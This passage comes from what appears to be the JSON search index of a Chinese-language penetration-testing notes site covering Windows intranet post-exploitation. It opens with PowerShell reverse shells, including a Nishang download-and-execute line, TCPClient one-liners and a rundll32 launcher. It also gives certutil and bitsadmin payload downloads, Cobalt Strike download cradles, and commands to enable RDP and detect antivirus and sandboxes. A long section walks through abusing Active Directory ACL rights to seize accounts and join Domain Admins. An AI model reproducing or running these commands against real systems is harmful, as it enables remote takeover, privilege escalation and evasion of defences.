Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.203.140 -port 6666 NISHANG\u91cc\u9762\u62a0\u7684 \uff08\u4e5e\u4e10\u7248\uff09 $sm=(New-Object Net.Sockets.TCPClient(\"192.168.254.1\",55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)} \uff08\u8c6a\u534e\u7248\uff09 $client = New-Object System.Net.Sockets.TCPClient(\"192.168.254.1\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() (cmd\u4e13\u7248) rundll32.exe javascript:\"\"\\..\\mshtml,RunHTMLApplication \"\";document.write();r=new%20ActiveXObject(\"\"WScript.Shell\"\").run(\"\"powershell -w h -ep bypass `$sm=(New-Object Net.Sockets.TCPClient('$IPAddress',$Port)).GetStream();[byte[]]`$bt=0..65535|%{0};while((`$i=`$sm.Read(`$bt, 0, `$bt.Length)) -ne 0){;`$d=(New-Object Text.ASCIIEncoding).GetString(`$bt,0, `$i);`$sb=(iex `$d 2>&1 | Out-String );`$sb2=`$sb + 'PS ' + (pwd).Path + '> ';`$sb=([text.encoding]::UTF8).GetBytes(`$sb2);`$sm.Write(`$sb,0,`$sb.Length);`$sm.Flush()}\"\",0,true); wmic \u67e5\u6740\u8f6f WMIC /namespace:\\\\root\\securitycenter2 path antivirusproduct GET displayName,productState, pathToSignedProductExe WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List \u5f003389 REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1 wmic /namespace:\\\\root\\cimv2\\terminalservices path win32_tsgeneralsetting where (TerminalName ='RDP-Tcp') call setuserauthenticationrequired 0 \u5e38\u89c1\u6740\u8f6f\u8fdb\u7a0b\u540d https://blog.csdn.net/weixin_39997829/article/details/92666552 cmd\u4e0b\u8f7d bitsadmin /transfer n http://www.xx.com/code.jpg c:\\users\\sdyp\\desktop\\ff.jpg C:\\Temp>certutil.exe -urlcache -split -f \"https://hackers.home/badcontent.txt\" bad.txt C:\\Temp>certutil.exe -decode bad.txt bad.exe \u83b7\u53d6\u76d8\u7b26 wmic logicaldisk where drivetype=3 get deviceid","title":"\u4e00\u4e9b\u559c\u6b22\u7528\u7684"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#ps-cs","text":"powershell.exe -c IEX((new-object net.webclient).downloadstring('http://xxx/a.ps1')) powershell -exec bypass -c \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex\" powershell -exec bypass -f \\\\webdavserver\\folder\\payload.ps1 (smb)","title":"ps cs \u4e0a\u7ebf"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_23","text":"Reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run","title":"\u67e5\u770b\u5f00\u673a\u81ea\u542f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_24","text":"Reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\Appraiser","title":"\u83b7\u53d6\u9065\u6d4b\u4efb\u52a1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_25","text":"Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct \u6839\u636e\u7cfb\u7edf\u7684\u4e0d\u540c\uff0c\u53cd\u75c5\u6bd2\u8f6f\u4ef6\u901a\u5e38\u4f1aWMI\u4e2d\u6ce8\u518c\u4e3a AntiVirusProduct \uff0c\u4fdd\u5b58\u5728 root\\SecurityCenter \u6216 root\\SecurityCenter2 \u547d\u540d\u7a7a\u95f4\u4e2d\u3002","title":"\u53cd\u75c5\u6bd2\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/#_26","text":"\u6c99\u76d2\u5f80\u5f80\u662f\u5355\u6838\u4e14\u5185\u5b58\u5c0f\u4e8e2g\uff0c\u53ef\u4ee5\u4ee5\u6b64\u4e3a\u51ed\u636e\u68c0\u6d4b Get-WmiObject -Class Win32_ComputerSystem NumberOfLogicalProcessors,TotalPhysicalMemory VMWARE\u865a\u62df\u673a\u5982\u4eca\u7528\u7684\u6bd4\u8f83\u591a\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u68c0\u6d4b\u8fdb\u7a0b\u4e2d\u662f\u5426\u5b58\u5728vmtoolsd\u4ee5\u53caBIOS\u5c5e\u6027\u91cc\u662f\u5426\u6709VMWARE\u5b57\u6837\u6765\u5224\u65ad\u662f\u5426\u662fVMWARE\u865a\u62df\u673a Get-WmiObject Win32_BIOS -Filter 'SerialNumber Like \"%VMware%\"' Get-WmiObject Win32_NetworkAdapter -Filter 'Manufacturer LIKE \"%VMware%\" OR Name LIKE \"%VMware%\"'","title":"\u7b80\u5355\u7684\u6c99\u76d2&amp;\u865a\u62df\u673a\u68c0\u6d4b"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/","text":"\u5229\u7528acl\u8fdb\u884c\u6a2a\u5411 \u76ee\u5f55 \u67e5\u770bacl GUID\u8f6c\u6362\u811a\u672c \u5229\u7528 GenericAll genericall on user genericall on group writeproperty Self-Membership Self-Membership ForceChangePassword writeowner GenericWrite writeDACL \u8bbf\u95ee\u63a7\u5236\u5217\u8868 (ACL) \u662f\u8bbf\u95ee\u63a7\u5236\u6761\u76ee (ACE) \u7684\u5217\u8868\u3002ACL \u4e2d\u7684\u6bcf\u4e2a ACE \u90fd\u6807\u8bc6\u4e00\u4e2a\u53d7\u6258\u8005\uff0c\u5e76\u4e3a\u8be5\u53d7\u6258\u8005\u6307\u5b9a\u5141\u8bb8\u3001\u62d2\u7edd\u6216\u5ba1\u8ba1\u7684\u8bbf\u95ee\u6743\u9650\u3002 \u67e5\u770bacl 1. \u9700\u8981\u4e0b\u8f7drsat\u5305\uff08Remote Server Administration Tools \uff09 import-module ActiveDirectory (Get-Acl -Path \"AD:CN=bob,CN=Users,DC=cia,DC=gov\").access \u5728IdentityReference\u5b57\u6bb5\u53ef\u4ee5\u770b\u5230Apache\u7528\u6237\u5bf9bob\u6709GenericAll\u6743\u9650 2. powerview \u67e5\u770b\u8c01\u5bf9bob\u6709genericall\u6743\u9650 Get-ObjectAcl -samAccountName bob -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} \u67e5\u770bbob\u5bf9\u54ea\u4e2a\u7528\u6237\u6709\u6743\u9650 Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq \"bob\"} \u82e5poweiview\u6ca1\u6709IdentityReference\u5c5e\u6027 Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq \"SID-xxx-x-x-x-xx\"} \u67e5\u770b\u4efb\u4f55\u7528\u6237\u5bf9\u67d0\u7528\u6237\u7ec4\u7684\u6743\u9650 \u5728distinguishedname\u4e2d\u627e\u5230\u67d0\u7528\u6237\u7ec4\u7684\u5bf9ldap\u8def\u5f84 Get-NetGroup \"domain admins\" -FullData \u8fdb\u884cacl\u67e5\u8be2 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"} \u7f3a\u70b9\uff1a\u6709\u53ef\u80fd\u770b\u4e0d\u5230\u8fd9\u4e2a\u6743\u9650\u662f\u8c01\u62e5\u6709\u7684(IdentityReference\u5b57\u6bb5\u770b\u4e0d\u5230)\u3002\u4f46\u53ef\u4ee5\u6839\u636eSecurityIdentifier\u6307\u5411\u7684sid\u77e5\u9053\u662f\u8c01\u4f5c\u7528\u4e8ebob 3. dsacls \"CN=bob,CN=Users,DC=cia,DC=gov\" \u6bd4\u8f83\u660e\u4e86 4. https://github.com/tevora-threat/SharpView sharpview.exe Invoke-ACLScanner -ResolveGUIDs 5. Import-Module ActiveDirectory cd AD: $Acl = Get-Acl 'CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=pentest,DC=com' $Acl.Access.Count $Acl.Access | where IdentityReference -match 'Domain Users'. //\u5b9a\u4e49\u67e5\u8be2\u8c01\u62e5\u6709\u6b64\u6743\u9650\uff1f GUID\u8f6c\u6362\u811a\u672c powershell \u9700\u8981\u4e0b\u8f7drsat\u5305 $ObjectTypeGUID = @{} $GetADObjectParameter=@{ SearchBase=(Get-ADRootDSE).SchemaNamingContext LDAPFilter='(SchemaIDGUID=*)' Properties=@(\"Name\", \"SchemaIDGUID\") } $SchGUID=Get-ADObject @GetADObjectParameter Foreach ($SchemaItem in $SchGUID){ $ObjectTypeGUID.Add([GUID]$SchemaItem.SchemaIDGUID,$SchemaItem.Name) } $ADObjExtPar=@{ SearchBase=\"CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)\" LDAPFilter='(ObjectClass=ControlAccessRight)' Properties=@(\"Name\", \"RightsGUID\") } $SchExtGUID=Get-ADObject @ADObjExtPar ForEach($SchExtItem in $SchExtGUID){ $ObjectTypeGUID.Add([GUID]$SchExtItem.RightsGUID,$SchExtItem.Name) } $ObjectTypeGUID | Format-Table -AutoSize $ObjectTypeGUID[[GUID]'bf967961-0de6-11d0-a285-00aa003049e2'] \u4f5c\u7528\u60c5\u51b5\uff1a \u8868\u793aCIA\\Exchange Trusted Subsystem\u5bf9bob\u7528\u6237\u7684GUID\u4e3abf967a06-0de6-11d0-a285-00aa003049e2\uff08objecttype\uff09\u7684\u5c5e\u6027\u6709WriteProperty\u6743\u9650\u3002\u4f46\u662f\u8fd9\u4e2aguid\u6307\u5411\u7684\u662f\u54ea\u4e00\u4e2a\u5c5e\u6027\u5462\uff1f\u5c31\u53ef\u4ee5\u7528\u8fd9\u4e2a\u811a\u672c\u8f6c\u5316\u51fa\u6765\u3002 powerview\u7684SecurityIdentifier\u4e5f\u53ef\u4ee5\u89e3\u51fa\u6765\u770b\u8c01\u6709\u8fd9\u4e2a\u6743\u9650\u3002 \u5229\u7528 \u4e0d\u5b89\u5168\u7684\u914d\u7f6e\u5bfc\u81f4\u6743\u9650\u63d0\u5347 ForceChangePassword\uff1a\u5f3a\u5236\u6539\u53d8\u5f53\u4e0b\u7684\u5bc6\u7801 AddMembers\uff1a\u53ef\u4ee5\u5bf9\u76ee\u6807\u7ec4\u6dfb\u52a0\u7528\u6237\uff08\u5305\u62ec\u81ea\u5df1\u7684\u8d26\u6237\uff09 GenericAll\uff1a\u5b8c\u5168\u63a7\u5236\u5bf9\u8c61\uff0c\u5305\u62ec\u66f4\u6539\u5bc6\u7801\u3001\u6ce8\u518cSPN\u3001\u6dfb\u52a0AD\u5bf9\u8c61\u5230\u76ee\u6807\u7ec4\u91cc\u9762 GenericWrite:\u66f4\u6539\u76ee\u6807\u5199\u5165\u53c2\u6570\uff0c\u5bfc\u81f4\u4e0b\u6b21\u7528\u6237\u767b\u5f55\u811a\u672c\u5c31\u8981\u6267\u884c WriteOwne\uff1a\u66f4\u65b0\u76ee\u6807\u5bf9\u8c61\u7684\u6240\u6709\u8005\uff0c\u53ef\u4ee5\u8ba9\u81ea\u5df1\u6210\u4e3a\u6240\u6709\u8005 WriteDACL\uff1a\u66f4\u65b0\u5bf9\u9762\u7684DACL\uff0c\u5c06ACL\u5199\u5165\u5bf9\u9762\u5b9e\u4f53\uff0c\u76f4\u63a5\u6388\u4e88\u6211\u4eec\u7684\u8d26\u6237\u5bf9\u5bf9\u8c61\u7684\u5b8c\u5168\u63a7\u5236\u6743 AllExtendedRights\uff1a\u80fd\u591f\u5bf9\u76ee\u6807\u5bf9\u8c61\u6267\u884c\u4e0e\u6269\u5c55 AD \u6743\u9650\u76f8\u5173\u7684\u4efb\u4f55\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u8fd9\u5305\u62ec\u5f3a\u5236\u66f4\u6539\u7528\u6237\u5bc6\u7801\u7684\u80fd\u529b\u3002 GenericAll \u5b8c\u5168\u63a7\u5236\u6743\u9650 genericall on user Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} \u770b\u5230bob\u5bf9delegate\u7528\u6237\u6709genericall\u6743\u9650 \u76f4\u63a5\u4fee\u6539\u5bc6\u7801\u5373\u53ef net user delegate password /domain genericall on group \u67e5\u770b\u67d0\u4e2a\u7ec4\u7684ldap\u5b57\u7b26\u4e32 Get-NetGroup \"domain admins\" -FullData \u67e5\u770b\u8be5\u7528\u6237\u7ec4\u7684dacl Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"} \u5982\u679c\u5bf9\u4e00\u4e2a\u7ec4\u6709genericall\u6743\u9650\uff0c\u5c31\u53ef\u4ee5\u628a\u81ea\u5df1\u52a0\u8fdb\u53bb\uff0c\u5bf9\u4e8e\u7ba1\u7406\u5458\u7ec4\u6765\u8bf4\uff0c\u52a0\u8fdb\u53bb\u5c31\u6210\u4e86\u7ba1\u7406\u5458\u3002 net group \"domain admins\" spotless /add /domain \u4e5f\u6709\u4e00\u4e9b\u5176\u5b83\u7684\u6dfb\u52a0\u7528\u6237\u547d\u4ee4\uff0c\u4f46\u90fd\u9700\u8981\u4e00\u4e9b\u811a\u672c\u4f9d\u8d56 # with active directory module Add-ADGroupMember -Identity \"domain admins\" -Members spotless # with Powersploit Add-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain \"offense.local\" writeproperty \u53ef\u4ee5\u5199\u5176\u5b83\u7528\u6237\u7684\u5c5e\u6027\u3002 \u5982\u679c\u53ef\u4ee5\u5bf9\u67d0\u4e2a\u7ec4\u5199\u5168\u90e8\u5c5e\u6027 \u90a3\u4e48\u5c31\u53ef\u4ee5\u628a\u8be5\u7528\u6237\u76f4\u63a5\u52a0\u5165\u6b64\u7528\u6237\u7ec4 Add-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain \"offense.local\" or net group \"domain admins\" spotless /add /domain Self-Membership \"Self-Membership\u662f\u4e00\u79cd\u6743\u9650\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u81ea\u5df1\u7ba1\u7406\u81ea\u5df1\u7684\u6210\u5458\u8eab\u4efd\u3002\u5177\u4f53\u6765\u8bf4\uff0cSelf-Membership\u6743\u9650\u5141\u8bb8\u7528\u6237\u6dfb\u52a0\u6216\u5220\u9664\u81ea\u5df1\u4f5c\u4e3a\u67d0\u4e2a\u7ec4\u7ec7\u3001\u56e2\u961f\u6216\u9879\u76ee\u7684\u6210\u5458\u3002\u8fd9\u610f\u5473\u7740\u7528\u6237\u53ef\u4ee5\u81ea\u4e3b\u51b3\u5b9a\u52a0\u5165\u6216\u79bb\u5f00\u7279\u5b9a\u7684\u7ec4\u7ec7\u3001\u56e2\u961f\u6216\u9879\u76ee\uff0c\u800c\u65e0\u9700\u7ba1\u7406\u5458\u6216\u5176\u4ed6\u6210\u5458\u7684\u5e72\u9884\u3002Self-Membership\u6743\u9650\u901a\u5e38\u7528\u4e8e\u63d0\u4f9b\u66f4\u5927\u7684\u81ea\u7531\u5ea6\u548c\u7075\u6d3b\u6027\uff0c\u4f7f\u7528\u6237\u80fd\u591f\u81ea\u4e3b\u7ba1\u7406\u81ea\u5df1\u7684\u6210\u5458\u8eab\u4efd\u3002\" Self-Membership \u5982\u679c\u5bf9\u67d0\u4e2a\u7ec4\u6709\u8fd9\u4e2a\u6743\u9650\uff0c\u4e14activedirectoryRights\u4e3aself\u6216\u8005\u6709writeproperty\uff0c\u4e5f\u53ef\u4ee5\u628a\u81ea\u5df1\u62c9\u8fdb\u8be5\u7528\u6237\u7ec4 Add-NetGroupUser -UserName spotless -GroupName \"domain admins\" -Domain \"offense.local\" or net group \"domain admins\" spotless /add /domain ForceChangePassword \u5982\u679c\u6211\u4eec\u5bf9\u67d0\u7528\u6237\u6709\u8be5\u6743\u9650\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u6539\u4ed6\u7684\u5bc6\u7801 powersploit Set-DomainUserPassword -Identity delegate -Verbosed \u6216\u8005 $c = Get-Credential Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose \u4e0a\u9762\u6307\u4ee4\u4e0d\u80fd\u4e00\u6b65\u5230\u4f4d\uff0c\u56e0\u4e3a\u4e2d\u95f4\u4f1a\u6709\u95ee\u8be2\u63d0\u793a\u8f93\u5165\u5bc6\u7801\u3002\u7528\u4e0b\u9762\u8fd9\u4e2a\u65b9\u6cd5\u5c31\u53ef\u4ee5\u76f4\u63a5\u6539\u4e86 Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose writeowner \u5982\u679c\u5f53\u524d\u7528\u6237\u5bf9\u67d0\u4e2a\u7ec4\u6709\u8be5\u6743\u9650\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u7ec4\u7684object's owner\u6539\u4e3a\u81ea\u5df1\uff0c\u4ece\u800c\u63a7\u5236\u8be5\u7ec4\uff0c\u6bd4\u5982\u53ef\u4ee5\u628a\u5176\u5b83\u7528\u6237\u6dfb\u52a0\u8fdb\u8be5\u7ec4\u3002 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\" -and $_.IdentityReference -eq \"OFFENSE\\spotless\"} powersploit Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity \"spotless\" -Verbose sid\u83b7\u53d6 wmic group where name=\"Domain Admins\" get name,sid,domain GenericWrite \"GenericWrite\" \u6743\u9650\u662f\u6307\u5bf9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u8fdb\u884c\u5199\u5165\u64cd\u4f5c\u7684\u6743\u9650\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5b83\u5141\u8bb8\u7528\u6237\u5bf9\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u8fdb\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u521b\u5efa\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002 \u4fee\u6539\u6587\u4ef6\u5185\u5bb9\u6216\u6587\u4ef6\u5939\u5c5e\u6027\u3002 \u5220\u9664\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002 \u91cd\u547d\u540d\u6587\u4ef6\u6216\u6587\u4ef6\u5939\u3002 \u5982\u679c\u5bf9\u67d0\u7528\u6237\u6709genericwrite\u6743\u9650\uff0c\u4e14objecttype\u4e3ascript-path\u3002\u90a3\u4e48\u5c31\u53ef\u4ee5\u4fee\u6539\u8be5\u7528\u6237\u7684login script\uff0c\u5f53\u8be5\u7528\u6237\u4e0b\u6b21\u767b\u5f55\u7684\u65f6\u5019\uff0c\u6211\u4eec\u5199\u5165\u5176login script\u7684\u6076\u610f\u811a\u672c\u5c31\u4f1a\u88ab\u89e6\u53d1 Module:ActiveDirectory Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \"\\\\10.0.0.5\\totallyLegitScript.ps1\" writeDACL \u5982\u679ca\u5bf9b\u6709writedacl\u6743\u9650\uff0c\u90a3\u4e48\u53ef\u4ee5a\u53ef\u4ee5\u5411b\u7684acl\u5199\u5165genericall\u6743\u9650\u6765\u5b9e\u73b0\u5b8c\u5168\u63a7\u5236\uff0c\u4ece\u800c\u63a5\u7ba1b\u7528\u6237\u3002 \u5982\u679ca\u5bf9\u67d0\u7528\u6237\u7ec4\u6709writeacl\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u4f7fa\u5bf9\u8be5\u7ec4\u6709genericall\u6743\u9650\u5e76\u628aa\u7528\u6237\u52a0\u5165\u5230\u8be5\u7ec4 \u53ef\u7528dsacls\u6216powersploit \u8ba9Brandi.Khan\u83b7\u5f97\u5bf9Carol.Dean\u7684genericall\u6743\u9650 dsacls \"\\\\10.0.1.100\\CN=Carol.Dean,CN=Users,DC=pwn,DC=local\" /I:T /G \"pwn\\Brandi.Khan:GA\" \u4f7ftest1\u83b7\u5f97\u5bf9bob\u7684genericall\u6743\u9650 Add-DomainObjectAcl -TargetIdentity 'bob' -PrincipalIdentity test1 -Rights All Add-DomainObjectAcl -TargetIdentity \"IT Desk\" -PrincipalIdentity snovvcrash -Domain tricky.com -Rights All -Verbose Add-DomainGroupMember -Identity \"IT Desk\" -Members snovvcrash -Verbose $ADSI = [ADSI]\"LDAP://CN=test,CN=Users,DC=offense,DC=local\" //\u53ef\u88ab\u4fee\u6539acl\u7684\u5bf9\u8c61\u7684ldap\u8def\u5f84 $IdentityReference = (New-Object System.Security.Principal.NTAccount(\"Username\")).Translate([System.Security.Principal.SecurityIdentifier])//\u5b9a\u4e49\u8c01\u4f1a\u83b7\u5f97\u8fd9\u4e2a\u7ec4\u7684\u6743\u9650 $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericAll\",\"Allow\" //\u5b9a\u4e49\u6388\u4e88\u6743\u9650\u4e3agenericall $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE) $ADSI.psbase.commitchanges()","title":"\u5229\u7528acl\u8fdb\u884c\u6a2a\u5411"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#acl","text":"","title":"\u5229\u7528acl\u8fdb\u884c\u6a2a\u5411"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#_1","text":"\u67e5\u770bacl GUID\u8f6c\u6362\u811a\u672c \u5229\u7528 GenericAll genericall on user genericall on group writeproperty Self-Membership Self-Membership ForceChangePassword writeowner GenericWrite writeDACL \u8bbf\u95ee\u63a7\u5236\u5217\u8868 (ACL) \u662f\u8bbf\u95ee\u63a7\u5236\u6761\u76ee (ACE) \u7684\u5217\u8868\u3002ACL \u4e2d\u7684\u6bcf\u4e2a ACE \u90fd\u6807\u8bc6\u4e00\u4e2a\u53d7\u6258\u8005\uff0c\u5e76\u4e3a\u8be5\u53d7\u6258\u8005\u6307\u5b9a\u5141\u8bb8\u3001\u62d2\u7edd\u6216\u5ba1\u8ba1\u7684\u8bbf\u95ee\u6743\u9650\u3002","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/%E5%88%A9%E7%94%A8acl%E8%BF%9B%E8%A1%8C%E6%A8%AA%E5%90%91/#acl_1","text":"1. \u9700\u8981\u4e0b\u8f7drsat\u5305\uff08Remote Server Administration Tools \uff09 import-module ActiveDirectory (Get-Acl -Path \"AD:CN=bob,CN=Users,DC=cia,DC=gov\").access \u5728IdentityReference\u5b57\u6bb5\u53ef\u4ee5\u770b\u5230Apache\u7528\u6237\u5bf9bob\u6709GenericAll\u6743\u9650 2. powerview \u67e5\u770b\u8c01\u5bf9bob\u6709genericall\u6743\u9650 Get-ObjectAcl -samAccountName bob -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} \u67e5\u770bbob\u5bf9\u54ea\u4e2a\u7528\u6237\u6709\u6743\u9650 Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq \"bob\"} \u82e5poweiview\u6ca1\u6709IdentityReference\u5c5e\u6027 Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -eq \"SID-xxx-x-x-x-xx\"} \u67e5\u770b\u4efb\u4f55\u7528\u6237\u5bf9\u67d0\u7528\u6237\u7ec4\u7684\u6743\u9650 \u5728distinguishedname\u4e2d\u627e\u5230\u67d0\u7528\u6237\u7ec4\u7684\u5bf9ldap\u8def\u5f84 Get-NetGroup \"domain admins\" -FullData \u8fdb\u884cacl\u67e5\u8be2 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq \"CN=Domain Admins,CN=Users,DC=offense,DC=local\"} \u7f3a\u70b9\uff1a\u6709\u53ef\u80fd\u770b\u4e0d\u5230\u8fd9\u4e2a\u6743\u9650\u662f\u8c01\u62e5\u6709\u7684(IdentityReference\u5b57\u6bb5\u770b\u4e0d\u5230)\u3002\u4f46\u53ef\u4ee5\u6839\u636eSecurityIdentifier\u6307\u5411\u7684sid\u77e5\u9053\u662f\u8c01\u4f5c\u7528\u4e8ebob 3. dsacls \"CN=bob,CN=Users,DC=cia,DC=gov\" \u6bd4\u8f83\u660e\u4e86 4. https://github.com/tevora-threat/SharpView sharpview.exe Invoke-ACLScanner -ResolveGUIDs 5. Import-Module ActiveDirectory cd AD: $Acl = Get-Acl 'CN=User,CN=Certificate Templates,CN=Public Key 